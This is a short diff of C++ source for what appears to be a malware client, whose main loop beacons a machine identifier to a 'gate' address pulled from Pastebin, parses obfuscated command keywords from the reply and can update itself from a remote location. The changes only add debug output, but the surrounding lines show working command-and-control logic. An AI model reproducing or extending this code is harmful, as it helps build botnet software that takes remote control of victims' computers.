@@ -75,12 +75,13 @@ int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, char*, int nShowCmd) {
 		//Main
 		std::string guid = Helpers::GetMachineGUID();
 		std::string finalPost = Client::returnFinalPost();
-
+		std::cout << finalPost;
+		//std::cout << "\n\n======";
 		while (true) {
 			try {
 
 				std::string responseFromGate = Client::sendPost(gateFromPatebin, finalPost);
-
+				//std::cout << responseFromGate;
 				if (responseFromGate.find(OBFUSCATE("dande")) != std::string::npos) {
 					std::vector<std::string> v = Helpers::explode(";", responseFromGate);
 					std::string random_str = Helpers::RandomString(10);
@@ -110,7 +111,6 @@ int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, char*, int nShowCmd) {
 						Helpers::update(v[2]);
 						return 0;
 					}
-
 				}
 			}
 			catch (const std::exception & e) {
